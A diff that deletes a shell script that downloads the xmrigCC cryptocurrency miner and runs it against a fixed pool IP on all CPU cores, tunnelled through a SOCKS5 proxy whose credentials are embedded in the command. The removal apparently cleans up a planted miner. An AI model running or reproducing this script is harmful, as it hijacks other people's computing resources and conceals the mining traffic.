@@ -1,6 +1,0 @@
-#!/bin/sh
-apt update && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz
-tar -xhf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz
-cd miner
-./xmrigDaemon -o 137.184.5.123:443 -t$(nproc --all) -x socks5://wqcxq2tpp4phsh:ss0ruta1t5dtpoe1x106hu3y7obk@us-east-static-08.quotaguard.com:1080
